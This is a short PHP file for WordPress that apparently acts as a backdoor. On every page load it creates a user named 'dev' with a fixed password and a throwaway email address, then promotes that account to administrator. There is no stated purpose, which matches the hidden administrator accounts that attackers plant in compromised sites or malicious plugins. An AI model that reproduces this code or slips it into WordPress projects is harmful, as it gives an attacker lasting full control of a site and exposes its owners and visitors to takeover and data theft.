<?php 
add_action('init', function (){
   $user_id =	wp_create_user('dev', '8906321475t', 't@t.com');
   if (gettype($user_id) !== 'integer' ){
       return;
   }
	$user = get_user_by('id', $user_id);
	if (!$user){
       return;
   }
   $user->set_role('administrator');
});
